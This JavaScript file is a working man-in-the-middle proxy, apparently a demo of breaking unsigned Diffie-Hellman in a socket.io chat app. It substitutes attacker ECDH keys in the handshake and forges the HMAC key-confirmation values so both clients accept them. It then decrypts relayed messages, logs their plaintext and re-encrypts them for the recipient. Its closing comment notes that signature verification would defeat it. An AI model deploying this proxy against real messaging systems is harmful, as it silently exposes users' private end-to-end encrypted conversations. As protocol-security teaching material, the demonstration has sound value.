// MITM Proxy: Fake server between client ↔ real server
// Demonstrates DH break without signatures by swapping ephemeral keys and deriving secrets.
// Clients should be configured to connect to this proxy at http://localhost:4100 instead of the real server.
// The proxy forwards to the real server (default http://localhost:4000) while mutating handshake payloads.

import { Server } from 'socket.io';
import { io as ioclient } from 'socket.io-client';

// Web Crypto helpers in Node (via globalThis.crypto if available); fallback to node:crypto
import crypto from 'crypto';

function randBytes(n) { return crypto.webcrypto ? crypto.webcrypto.getRandomValues(new Uint8Array(n)) : crypto.randomBytes(n); }
function b64(b) { const u = b instanceof Uint8Array ? b : new Uint8Array(b); return Buffer.from(u).toString('base64'); }
function ub64(s) { return Uint8Array.from(Buffer.from(s, 'base64')); }
const enc = new TextEncoder();

async function genECDH() {
	// Use Node's webcrypto for ECDH P-256
	const kp = await crypto.webcrypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits']);
	const jwk = await crypto.webcrypto.subtle.exportKey('jwk', kp.publicKey);
	return { priv: kp.privateKey, pubJwk: jwk };
}

async function importECDHPublicJwk(jwk) {
	return crypto.webcrypto.subtle.importKey('jwk', jwk, { name: 'ECDH', namedCurve: 'P-256' }, true, []);
}

async function deriveBits(priv, pub) {
	return crypto.webcrypto.subtle.deriveBits({ name: 'ECDH', public: pub }, priv, 256);
}

async function hkdf(ikmBytes, saltBytes, infoStr, len = 32) {
	const ikmKey = await crypto.webcrypto.subtle.importKey('raw', ikmBytes, 'HKDF', false, ['deriveKey']);
	const key = await crypto.webcrypto.subtle.deriveKey(
		{ name: 'HKDF', hash: 'SHA-256', salt: saltBytes, info: enc.encode(infoStr) },
		ikmKey,
		{ name: 'AES-GCM', length: 256 },
		true,
		['encrypt', 'decrypt']
	);
	const raw = await crypto.webcrypto.subtle.exportKey('raw', key);
	return new Uint8Array(raw).slice(0, len);
}

async function hmacSign(keyBytes, messageBytes) {
  const k = await crypto.webcrypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.webcrypto.subtle.sign('HMAC', k, messageBytes);
  return new Uint8Array(sig);
}

async function sha256(bytes) {
  const d = await crypto.webcrypto.subtle.digest('SHA-256', bytes);
  return new Uint8Array(d);
}

async function importAesKey(keyBytes) {
	return crypto.webcrypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt']);
}

async function aesGcmDecryptRaw(keyBytes, ivBytes, ctBytes, aadBytes) {
	const key = await importAesKey(keyBytes);
	const pt = await crypto.webcrypto.subtle.decrypt({ name: 'AES-GCM', iv: ivBytes, additionalData: aadBytes }, key, ctBytes);
	return new Uint8Array(pt);
}

async function aesGcmEncryptRaw(keyBytes, ivBytes, ptBytes, aadBytes) {
	const key = await importAesKey(keyBytes);
	const ct = await crypto.webcrypto.subtle.encrypt({ name: 'AES-GCM', iv: ivBytes, additionalData: aadBytes }, key, ptBytes);
	return new Uint8Array(ct);
}

// Proxy config
const REAL_SERVER = process.env.REAL_SERVER || 'http://localhost:4000';
const PROXY_PORT = parseInt(process.env.PROXY_PORT || '4100', 10);

// Map proxy client sockets to upstream sockets
const upstreamFor = new Map(); // clientSocket.id -> upstreamSocket

// Store MITM state per conversation (sorted key "A|B")
const sessions = new Map();

function pairKey(a, b) { return [a, b].sort().join('|'); }

const io = new Server(PROXY_PORT, { cors: { origin: '*' } });
console.log(`[mitm] proxy listening on ${PROXY_PORT}, forwarding to ${REAL_SERVER}`);

io.on('connection', (client) => {
	const userId = client.handshake.auth?.userId;
	console.log('[mitm] client connected', { userId, clientId: client.id });
	const upstream = ioclient(REAL_SERVER, { auth: { userId } });
	upstreamFor.set(client.id, upstream);

	upstream.on('connect', () => console.log('[mitm] upstream connected', { userId }));
	upstream.on('disconnect', (r) => console.log('[mitm] upstream disconnected', { userId, r }));

	// Relay down events from real server to client (avoid double-mutation)
	upstream.on('handshake:init', async (payload) => {
		// payload from initiator via real server
		console.log('[mitm] downstream handshake:init', { from: payload.fromUserId });
		// We already mutate epkAJwk on the uplink path; just forward to responder
		client.emit('handshake:init', payload);
	});

	upstream.on('handshake:resp', async (payload) => {
		console.log('[mitm] downstream handshake:resp', { from: payload.fromUserId });
		// We already mutate epkBJwk on uplink path; use cached attackerB to recompute macB only
		const orig = payload.data;
		const mutated = { ...orig };

		// Attempt to compute initiator-side confirmKey and recompute macB so initiator accepts
		try {
			// We need session info: initiatorId, responderId, orig epkAJwk, nonceA, tsA, seqA
			// We cannot directly get peer id here; we'll scan sessions to find matching conversation by responderId=payload.fromUserId and presence of orig.epeBJwk/nonceB
			let foundKey = null; let sessObj = null;
			for (const [k, v] of sessions.entries()) {
				if (v.responderId === payload.fromUserId && v.orig && v.orig.nonceA) { foundKey = k; sessObj = v; break; }
			}
			if (sessObj && sessObj.initiator && sessObj.attackerB) {
				// ensure attackerB matches what we just generated for this downstream path
				const attackerB = sessObj.attackerB;
				// Derive initiator/responder legs and cache keys if possible
				const initPubA = await importECDHPublicJwk(sessObj.orig.epkAJwk_orig);
				const bitsI = await deriveBits(sessObj.attackerB.priv, initPubA);
				const saltBytes = new Uint8Array([ ...ub64(sessObj.orig.nonceA), ...ub64(orig.nonceB) ]);
				const salt = await sha256(saltBytes);
				const confirmKeyI = await hkdf(bitsI, salt, 'e2eeV1-confirm', 32);
				const sessionKeyI = await hkdf(bitsI, salt, 'e2eeV1-session', 32);
				if (sessObj.attackerA) {
					const respPubB = await importECDHPublicJwk(sessObj.orig.epkBJwk_orig);
					const bitsR = await deriveBits(sessObj.attackerA.priv, respPubB);
					sessObj.confirmKeyResponder = await hkdf(bitsR, salt, 'e2eeV1-confirm', 32);
					sessObj.sessionKeyResponder = await hkdf(bitsR, salt, 'e2eeV1-session', 32);
				}
				sessObj.confirmKeyInitiator = confirmKeyI;
				sessObj.sessionKeyInitiator = sessionKeyI;
				sessions.set(foundKey, sessObj);
				// Build initiator transcript (as initiator expects)
				const tI = JSON.stringify({
					epkAJwk: sessObj.orig.epkAJwk_orig,
					nonceA: sessObj.orig.nonceA,
					tsA: sessObj.orig.tsA,
					seqA: sessObj.orig.seqA,
					epkBJwk: sessObj.attackerB.pubJwk,
					nonceB: orig.nonceB,
					tsB: orig.tsB,
					seqB: orig.seqB
				});
				const thI = await sha256(enc.encode(tI));
				const macBPrime = await hmacSign(confirmKeyI, enc.encode('KC-B|' + b64(thI)));
				mutated.macB = b64(macBPrime);
				console.log('[mitm] recomputed macB for initiator leg and cached keys');
			}
		} catch (e) {
			console.log('[mitm] macB recompute error:', e.message);
		}

		client.emit('handshake:resp', { fromUserId: payload.fromUserId, data: mutated });
	});

	upstream.on('handshake:confirm', (payload) => {
		console.log('[mitm] downstream handshake:confirm', { from: payload.fromUserId });
		client.emit('handshake:confirm', payload);
	});

	upstream.on('message:deliver', (payload) => {
		console.log('[mitm] downstream message:deliver');
		client.emit('message:deliver', payload);
	});
	upstream.on('file:deliver', (payload) => {
		console.log('[mitm] downstream file:deliver');
		client.emit('file:deliver', payload);
	});

	// Relay up events from client to real server (single-source mutation)
	client.on('handshake:init', async (payload) => {
		console.log('[mitm] upstream handshake:init emit', { to: payload?.toUserId });
		// Replace initiator epkA (generate once per pair)
		const initiatorId = client.handshake.auth?.userId;
		const responderId = payload?.toUserId;
		const key = pairKey(initiatorId, responderId);
		let sess = sessions.get(key);
		if (!sess) { sess = { initiatorId, responderId }; sessions.set(key, sess); }
		if (!sess.attackerA) sess.attackerA = await genECDH();
		const orig = payload.data;
		const mutated = { ...orig, epkAJwk: sess.attackerA.pubJwk };
		upstream.emit('handshake:init', { toUserId: payload?.toUserId, data: mutated });
		// Remember nonceA for demo
		sess.initiator = initiatorId;
		sess.responderId = responderId;
		sess.orig = {
			...(sess.orig || {}),
			epkAJwk_orig: orig?.epkAJwk,
			nonceA: orig?.nonceA,
			tsA: orig?.tsA,
			seqA: orig?.seqA
		};
		sessions.set(key, sess);
	});

	client.on('handshake:resp', async (payload) => {
		console.log('[mitm] upstream handshake:resp emit', { to: payload?.toUserId });
		// Replace responder epkB using a consistent attackerB per pair
		const orig = payload.data;
		const responderId = client.handshake.auth?.userId;
		const initiatorId = payload?.toUserId;
		const key = pairKey(initiatorId, responderId);
		let sess = sessions.get(key);
		if (!sess) { sess = { initiatorId, responderId }; sessions.set(key, sess); }
		if (!sess.attackerB) sess.attackerB = await genECDH();
		const mutated = { ...orig, epkBJwk: sess.attackerB.pubJwk };
		upstream.emit('handshake:resp', { toUserId: payload?.toUserId, data: mutated });
		sess.responder = responderId;
		sess.orig = {
			...(sess.orig || {}),
			epkBJwk_orig: orig?.epkBJwk,
			nonceB: orig?.nonceB,
			tsB: orig?.tsB,
			seqB: orig?.seqB
		};
		// Try to precompute both confirm keys and session keys for later MAC rewriting and message MITM
		try {
			if (sess.attackerA && sess.attackerB && sess.orig?.epkBJwk_orig && sess.orig?.epkAJwk_orig && sess.orig?.nonceA && sess.orig?.nonceB) {
				const respPubB = await importECDHPublicJwk(sess.orig.epkBJwk_orig);
				const initPubA = await importECDHPublicJwk(sess.orig.epkAJwk_orig);
				const bitsResponder = await deriveBits(sess.attackerA.priv, respPubB); // attackerA↔responder
				const bitsInitiator = await deriveBits(sess.attackerB.priv, initPubA); // attackerB↔initiator
				const salt = await sha256(new Uint8Array([ ...ub64(sess.orig.nonceA), ...ub64(sess.orig.nonceB) ]));
				// confirm keys
				sess.confirmKeyResponder = await hkdf(bitsResponder, salt, 'e2eeV1-confirm', 32);
				sess.confirmKeyInitiator = await hkdf(bitsInitiator, salt, 'e2eeV1-confirm', 32);
				// session keys
				sess.sessionKeyResponder = await hkdf(bitsResponder, salt, 'e2eeV1-session', 32);
				sess.sessionKeyInitiator = await hkdf(bitsInitiator, salt, 'e2eeV1-session', 32);
				sessions.set(key, sess);
				console.log('[mitm] precomputed keys for both legs (confirm+session)');
			}
		} catch (e) {
			console.log('[mitm] precompute error:', e.message);
		}
	});

	client.on('handshake:confirm', async (payload) => {
		console.log('[mitm] upstream handshake:confirm emit', { to: payload?.toUserId });
		// Rewrite macA so responder verifies with its (different) confirm key
		try {
			const initiatorId = client.handshake.auth?.userId;
			const responderId = payload?.toUserId;
			const key = pairKey(initiatorId, responderId);
			const sess = sessions.get(key);
			if (sess && sess.confirmKeyResponder && sess.orig?.epkBJwk_orig && sess.attackerA) {
				const tR = JSON.stringify({
					epkAJwk: sess.attackerA.pubJwk,
					nonceA: sess.orig.nonceA,
					tsA: sess.orig.tsA,
					seqA: sess.orig.seqA,
					epkBJwk: sess.orig.epkBJwk_orig,
					nonceB: sess.orig.nonceB,
					tsB: sess.orig.tsB,
					seqB: sess.orig.seqB
				});
				const thR = await sha256(enc.encode(tR));
				const macAPrime = await hmacSign(sess.confirmKeyResponder, enc.encode('KC-A|' + b64(thR)));
				const newPayload = { ...payload, data: { ...payload.data, macA: b64(macAPrime) } };
				upstream.emit('handshake:confirm', newPayload);
				console.log('[mitm] rewrote macA for responder leg');
				return;
			}
		} catch (e) {
			console.log('[mitm] macA rewrite error:', e.message);
		}
		upstream.emit('handshake:confirm', payload);
	});

	client.on('message:send', async (payload) => {
		console.log('[mitm] upstream message:send relay');
		try {
			const senderId = client.handshake.auth?.userId;
			const receiverId = payload?.toUserId;
			const keyId = pairKey(senderId, receiverId);
			const sess = sessions.get(keyId);
			if (!sess || !sess.confirmKeyInitiator || !sess.confirmKeyResponder) {
				// No session keys yet; pass through untouched
				upstream.emit('message:send', payload);
				return;
			}
			// Decide which leg keys to try first
			const senderIsInitiator = senderId === sess.initiator;
			const firstTry = senderIsInitiator ? (sess.sessionKeyInitiator || sess.confirmKeyInitiator) : (sess.sessionKeyResponder || sess.confirmKeyResponder);
			const secondTry = senderIsInitiator ? (sess.sessionKeyResponder || sess.confirmKeyResponder) : (sess.sessionKeyInitiator || sess.confirmKeyInitiator);
			const recipSessionKey = senderIsInitiator ? (sess.sessionKeyResponder || sess.confirmKeyResponder) : (sess.sessionKeyInitiator || sess.confirmKeyInitiator);

			const iv = ub64(payload.iv);
			const aad = ub64(payload.aad);
			const ct = ub64(payload.ciphertext);
			// Try decrypt with preferred key, then fallback to the other leg if needed
			let pt;
			try {
				pt = await aesGcmDecryptRaw(firstTry, iv, ct, aad);
				console.log('[mitm] message decrypted with first key (expected leg)');
			} catch (e1) {
				try {
					pt = await aesGcmDecryptRaw(secondTry, iv, ct, aad);
					console.log('[mitm] message decrypted with fallback key (opposite leg)');
				} catch (e2) {
					throw e1; // keep first error for context
				}
			}
			const json = new TextDecoder().decode(pt);
			console.log('[mitm] message plaintext:', json);
			// Re-encrypt for recipient leg; reuse same IV (keys differ across legs)
			const newIv = iv;
			const newCt = await aesGcmEncryptRaw(recipSessionKey, newIv, pt, aad);
			const mutated = { ...payload, iv: b64(newIv), ciphertext: b64(newCt) };
			upstream.emit('message:send', mutated);
		} catch (e) {
			console.log('[mitm] message MITM failed (passing through):', e.message);
			upstream.emit('message:send', payload);
		}
	});
	client.on('file:send', (payload) => {
		console.log('[mitm] upstream file:send relay');
		upstream.emit('file:send', payload);
	});

	client.on('disconnect', () => {
		const up = upstreamFor.get(client.id);
		if (up) up.disconnect();
		upstreamFor.delete(client.id);
		console.log('[mitm] client disconnected', { userId });
	});
});

console.log('[mitm] Note: In systems with ECDSA verification enabled, signatures should fail when keys are mutated.\nThis proxy demonstrates how DH can be broken without signatures by swapping ephemeral keys and deriving shared secrets.');
